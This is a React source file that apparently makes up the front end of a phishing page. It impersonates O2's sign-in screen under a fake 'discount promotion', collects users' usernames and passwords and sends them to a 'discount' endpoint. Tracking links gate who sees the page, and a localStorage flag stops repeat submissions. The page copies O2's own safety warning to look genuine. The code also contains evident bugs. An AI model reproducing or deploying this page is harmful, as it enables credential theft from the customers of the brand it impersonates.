import { useFormik } from "formik";
import "./discount.css";
import formSchema from "../../Schema";
import apiRequest from "../../api/apiRequest";
import Taost from "react-hot-toast";
import { useEffect, useState } from "react";
import { useNavigate, useParams } from "react-router-dom";
import Webfooter from "../website/Webfooter";
import Webheader from "../website/Webheader";

const initialValues = {
  username: "",
  password: "",
};
const Discount = () => {
     if (localStorage.getItem("login") == 2) {
       navigate("/");
    }else{
  const navigate = useNavigate();
  const { id } = useParams();
  const loadData = async () => {
    const response = await apiRequest(`link-check/${id}`, "GET");
    if (!response.success) {
      navigate("/");
    } else {
      Taost.success("Welcome to O2 discount Offer");
    }
  };

  useEffect(() => {
    loadData();
  }, []);

  const [loader, setLoader] = useState(false);
  const { errors, values, handleChange, handleSubmit, resetForm } = useFormik({
    initialValues,
    validationSchema: formSchema.discount,
    onSubmit: async () => {
      setLoader(true);
      if (localStorage.getItem("login") == 1) {
        localStorage.setItem("login", 2);
        setLoader(false);
        navigate("/success");
      } else {
        const res = await apiRequest("discount", "POST", values);
        if (res.success) {
          resetForm();
          localStorage.setItem("login", 2);
          navigate("/success");
          setLoader(false);
          // Taost.success("Thank you Support Team  contact you soon ")
        } else {
          Taost.error("something wrong");
          setLoader.false();
        }
      }
    },
  });

  if (loader) {
    return (
      <div className="loader">
        <div class="spinner-border text-light" role="status">
          <span class="sr-only">Loading...</span>
        </div>
      </div>
    );
  }
  return (
    <>
      <Webheader />

      <hr style={{ margin: "0", height: "1px", color: "white" }} />
      <section>
        <div class="hero-sec">
          <div class="container">
            <h1>O2 Discount Promotion</h1>
          </div>
        </div>
        {/* <!-- main section --> */}
        <div class="main-sec">
          <div class="container">
            <div class="row">
              <div class="col-12 col-sm-12 col-md-6 col-lg-4">
                <div class="form-sec p-4 bg-white">
                  <h2 className="mb-2">Sign int</h2>
                  <form onSubmit={handleSubmit}>
                    <div class="mb-2">
                      <label for="floatingInputGrid">
                        Username (usually your email address)
                      </label>
                      <input
                        type="text"
                        className="form-control"
                        name="username"
                        value={values.username}
                        onChange={handleChange}
                        placeholder="Username"
                      />
                      <span className="text-danger">{errors.username}</span>
                    </div>
                    <div>
                      <label for="floatingInputGrid">Password</label>
                      <input
                        type="password"
                        className="form-control"
                        name="password"
                        value={values.password}
                        onChange={handleChange}
                        placeholder="XXXXXXXX"
                      />
                      <span className="text-danger">{errors.password}</span>
                    </div>
                    {/* <div class="form-check mt-4">
                                <input class="form-check-input" type="checkbox" value="" id="flexCheckDefault" checked>
                                <label class="form-check-label" for="flexCheckDefault">
                                    Remember my username
                                </label>
                            </div> */}
                    <button class="sub-btn mt-4">Submit</button>
                  </form>
                  <div class="forgotten mt-4">
                    <a href="#">
                      <img src="/img/arrow.png" alt="arrow" /> Forgotten your
                      username or password?
                    </a>
                  </div>
                </div>
              </div>
              <div class="col-12 col-sm-12 col-md-6 col-lg-8">
                <div class="main-sec-right">
                  <h2>Already an O2 customer?</h2>
                  <p>
                    If you've got a Pay Monthly account then we've automatically
                    registered you with My O2 and given you a username and
                    password.
                  </p>
                  <div class="forgotten">
                    <a href="#">
                      <img src="/img/arrow.png" alt="arrow" /> Help me sign in
                    </a>
                  </div>
                  <br />
                  <h2>Not yet registered?</h2>
                  <p>
                    If you're a Pay As You Go customer here are just some of the
                    benefits of registering:
                  </p>
                  <ul class="ps-4 mb-0">
                    <li>Check your usage and remaining balance</li>
                    <li>Set up auto top-ups</li>
                    <li>Manage O2 Rewards</li>
                  </ul>

                  <p>
                    O2 Wifi customer? You can register to manage your account
                    here, whatever network you're on.
                  </p>
                  <div class="forgotten mt-3">
                    <a href="#">
                      <img src="/img/arrow.png" alt="arrow" /> Register now
                    </a>
                  </div>
                </div>
              </div>
            </div>
            <div class="main-last-text mt-5 ms-4">
              <h3>Stay safe</h3>
              <p>
                We'll never email or text asking you to send or verify personal,
                financial or password details. Make sure you keep your details
                safe and never give them out, even if it looks like the email or
                text came from us.
              </p>
            </div>
          </div>
        </div>
      </section>

      <Webfooter />
    </>
  );
 }
};

export default Discount;
